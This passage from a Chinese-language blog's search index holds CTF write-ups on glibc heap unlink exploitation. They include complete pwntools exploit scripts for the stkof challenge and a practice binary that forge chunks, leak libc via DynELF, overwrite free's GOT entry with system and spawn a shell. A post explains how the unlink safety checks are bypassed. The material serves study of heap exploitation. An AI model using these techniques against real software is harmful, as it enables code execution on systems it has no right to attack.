delete(2) res = p.recvuntil('OK\n').split('\x0aOK')[0] if res == '': res = '\x00' return res #返回值可以为任意长度，并不清楚原因chunk_ptr = 0x602148add(0x80)add(0x80)add(0x80)add(0x80)#unlinkpayload = p64(0) + p64(0x0)payload += p64(chunk_ptr-0x18) + p64(chunk_ptr-0x10)payload += 'a' * 0x60payload += p64(0x80) + p64(0x90)set(1, payload)delete(2)p.recvuntil('OK\n')#freegot写为putspayload = p64(0)*3 + p64(chunk_ptr-0x18) + p64(free_got)set(1, payload)set(2, p64(puts))#leakd = DynELF(leak, elf = elf)system = d.lookup('system', 'libc')print "system addr: %#x" % system#freegot写为systempayload = p64(0)*3 + p64(chunk_ptr-0x18) + p64(free_got)set(1, payload)set(2, p64(system))#getshellset(3, '/bin/sh\x00')delete(3)p.interactive() 相关链接题目链接：stkof相关题目：unlink例题unlink漏洞分析：堆利用学习之unlink]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>unlink</tag>
        <tag>堆利用</tag>
        <tag>writeup</tag>
        <tag>how2heap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[unlink例题]]></title>
    <url>%2Fpost%2F503970b4.html</url>
    <content type="text"><![CDATA[题目描述先运行该程序，发现是一道典型的菜单题，有增删查改功能。知识点：unlink 123456nick@nick-machine:~/pwn_learn/heapLearn/unlink/t1$ ./heap1.Add chunk2.Set chunk3.Delete chunk4.Print chunk5.Exit 程序分析其中，add函数没有对申请的chunk大小做限制。在set函数中：123456789101112ssize_t set()&#123; int v1; // [esp+Ch] [ebp-Ch] v1 = -1; write(1, "Set chunk index:", 0x10u); __isoc99_scanf("%d", &amp;v1); if ( v1 &lt; 0 ) return write(1, "Set chunk data error!\n", 0x16u); write(1, "Set chunk data:", 15u); return read(0, buf[v1], 0x400u);&#125; 可以发现代码中没有对写入的长度做限制，存在溢出同时，buf[]中储存指向chunk的指针，且为全局变量，可以获得地址由此确定程序中存在unlink漏洞 在delete函数中：123456789101112void delete()&#123; int v0; // [esp+Ch] [ebp-Ch] v0 = -1; write(1, "Delete chunk index:", 0x13u); __isoc99_scanf("%d", &amp;v0); if ( v0 &gt;= 0 ) free(buf[v0]); else write(1, "Delete chunk error!\n", 0x14u);&#125; 释放chunk后没有对指针赋0，会造成UAF漏洞，但此题不会利用到。 在print函数中，可输出任意index的chunk，用于泄露数据。 由于题目没有给出libc，所以需要用到DynELF来泄露system函数，可以利用unlink后修改chunk指针来实现任意读 漏洞利用 分配3个连续的chunk，大小为0x80（smallchunk）chunk0、chunk1: 用于构造unlinkchunk2：用于防止被top chunk合并 在chunk0中构造fake chunk，准备unlink。prevsize：0size：0x80fd：chunk_ptr - 0xcbk：chunk_ptr - 0x8注意：chunk_ptr是指向chunk0的指针变量所在的地址，即&amp;buf[0]，而非指针指向的地址 从chunk0继续溢出到chunk1，修改prevsize、size（inuse位）prevsize: 0x80size：0x88 释放chunk1，触发unlink，此后buf[0]，即chunk0的指针的值被修改为了chunk_ptr-0xc 写入chunk0，构造leak函数，准备利用DynELF来泄露system，由于指针被修改，实际写入地址是chunk_ptr-0xc。payload = &#39;a&#39; * 0xc //paddingpayload += p32(chunk_ptr-0xc) //保留chunk0的指针，以便重复利用payload += p32(addr) //将addr写入chunk1的指针(buf[1])此后输出chunk1即为输出地址addr的值，实现可重复利用的任意地址读取 利用DynELF泄露出system函数地址 利用（5）的payload，将addr设为free_got，再向chunk1中写入system的地址。因为chunk1的指针被覆盖为free_got，所以会将system的地址写入free的got表 向chunk2中写入&#39;/bin/sh\x00&#39;，调用free(chunk2)，因为free被覆盖为system，所以实际调用system(chunk2)，成功getshell 我的exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from pwn import *elf = ELF('heap')free_got = elf.got['free']chunk_ptr = 0x8049d60#p = process('heap')p = remote('127.0.0.1', 4000)def add_chunk(size): p.recvuntil('5.Exit\n') p.sendline('1') p.recvuntil('Input the size of chunk you want to add:') p.sendline(str(size))def set_chunk(index, data): p.recvuntil('5.Exit\n') p.sendline('2') p.recvuntil('Set chunk index:') p.sendline(str(index)) p.recvuntil('Set chunk data:') p.send(data)def delete_chunk(index): p.recvuntil('5.Exit\n') p.sendline('3') p.recvuntil('Delete chunk index:') p.sendline(str(index))def print_chunk(index): p.recvuntil('5.Exit\n') p.sendline('4') p.recvuntil('Print chunk index:') p.sendline(str(index)) return p.recvline()def leak(addr): payload = 'a' * 0xc + p32(chunk_ptr-0xc) + p32(addr) set_chunk(0, payload) res = print_chunk(1)[:4] print "leaking: %#x ---&gt; %s" % (addr, res.encode('hex')) return res add_chunk(128)add_chunk(128)add_chunk(128)set_chunk(2, '/bin/sh\x00')#在第一个chunk的数据区域构造一个假chunk，size为0x80，并设置fd、bkpayload = p32(0) + p32(0x80) + p32(chunk_ptr-0xc) + p32(chunk_ptr-0x8)#从第一个chunk写入数据覆盖到第二个chunk，讲第二个chunk的prev_size设为0x80，并将size的in_use标志置0payload += 'a' * (0x80-0x10) + p32(0x80) + p32(0x88)set_chunk(0, payload)#free第二个chunk，将会触发unlinkdelete_chunk(1)#泄露system的地址d = DynELF(leak, elf = elf)system = d.lookup('system', 'libc')print "system addr: %#x" % system#将free_got的地址覆盖掉第二个chunk的地址payload = 'a' * 0xc + p32(chunk_ptr-0xc) + p32(free_got)set_chunk(0, payload)#修改第二个chunk，由于地址被覆盖，实际修改的是free的got表，将其修改为system的地址set_chunk(1, p32(system))#调用free，实际调用systemdelete_chunk(2)p.interactive() 注意 set_chunk函数中最后应该用send而非sendline，否则在发送的数据末尾会多出一个’\n’，而导致比预期多覆盖一个字节，在leak时会使chunk2的指针的一个字节被修改，最后free时导致无法getshell。若使用sendline，请在chunk1后再多加一个chunk来隔开存放’/bin/sh\x00’的chunk。 unlink学习过程中应该着重弄清楚什么时候是地址、什么时候是值 此题为32位程序，若是64位应将p32(chunk_ptr-0xc) + p32(chunk_ptr-0x8)改为p32(chunk_ptr-0x18) + p32(chunk_ptr-0x10) 相关链接题目链接：heapHITCON CTF 2014-stkof]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>unlink</tag>
        <tag>堆利用</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[堆利用学习之unlink]]></title>
    <url>%2Fpost%2Fdbc7b210.html</url>
    <content type="text"><![CDATA[原理unlink是内存操作中的一个宏， 用来从双向链表中取出一个free chunk，其过程中的指针操作存在任意写的漏洞。从双向链表中取出节点的过程，若是学过数据结构应该都比较清楚，主要代码是： 12P-&gt;fd-&gt;bk = P-&gt;bkP-&gt;bk-&gt;fd = P-&gt;fd 但是在unlink宏中，为了安全性还增加了一些检查：unlink源码：1234567891011if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) malloc_printerr ("corrupted size vs. prev_size"); FD = P-&gt;fd;BK = P-&gt;bk;if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) malloc_printerr (check_action, "corrupted double-linked list", P);else &#123;FD-&gt;bk = BK;BK-&gt;fd = FD;...&#125; 要利用该漏洞，先要绕过这里的两处检查（64位为例） 第一处检查chunksize(P) != prev_size (next_chunk(P))，检查下一个chunk的prevsize是否等于当前chunk的size，所以需要通过溢出等手段设置下一chunk的prevsize 第二处检查__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)，检查当前chunk是否是前一个chunk的后继，同时也是后一个chunk的前驱，也就是检查链表是否真的是链接好的。但是这个检查有个致命的缺点: 因为FD-&gt;bk == *(FD+0x18)、BK-&gt;fd == *(BK+0x10)若在FD中存入&amp;P-0x18，那么表达式将变为*FD-&gt;bk = ((&amp;P-0x18)+0x18) == *&amp;P == P若在BK中存入&amp;P-0x10，那么表达式将变为*BK-&gt;fd = ((&amp;P-0x10)+0x10) == *&amp;P == P从而就绕过了检查 注意：&amp;P是表示指向目标chunk的指针的地址 绕过检查后，满足FD-&gt;bk == P &amp;&amp; BK-&gt;fd == P，所以有：12FD-&gt;bk = BK; // P = &amp;P-0x10BK-&gt;fd = FD; // P = &amp;P-0x18 在此之后，P就指向了比自己的地址低0x18个字节的位置，可以通过再次向P写入从而覆盖掉P本身，将其修改为任意地址，第三次向P写入则实现了任意地址写。 触发前提 堆指针是全局变量，或其地址是可泄露的 能够free一个smallchunk或largechunk(可以是伪造的) 能够控制下一chunk的prevsize和size 利用过程（64位为例）法一存在堆溢出时： 分配连续3个chunk a, b, c 在a中伪造chunkp64(0) + p64(0x80) + p64(head_ptr-0x18) + p64(head_ptr-0x10) + padding 覆盖b的prevsize和size，修改inuse位，使之可以与a合并p64(0x80) + p64(0x90) free掉b，触发unlink 写入a，覆盖指针为任意地址，p64(0)*3 + p64(addr) 再次写入a，任意地址写入 法二不能溢出，但有double free 分配连续3个fastchunk a, b, c 释放a，此时并不会修改后面的inuse位和prevsize 申请一个大内存，触发fastbin合并，这时会将fastbin中的a取出放入unsortedbin，可以实现对b的inuse位进行修改 触发double free，将a再次释放，放入fastbin 再申请与a相同大小的chunk，就会从fastbin中将a返回，同时不会改变b的inuse 布置a内存，释放b，触发unlink 题目 一道典型的unlink例题 HITCON CTF 2014-stkof HITCON CTF 2016-SleepyHolder]]></content>
      <categories>
        <category>堆利用学习</category>
      </categories>
      <tags>
        <tag>unlink</tag>
        <tag>堆利用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[test]]></title>
    <url>%2Fpost%2Fd87f7e0c.html</url>
    <content type="text"><![CDATA[这是一个测试1234567#include &lt;stdio.h&gt;int main()&#123; printf("hello world"); return 0;&#125;]]></content>
  </entry>
</search>
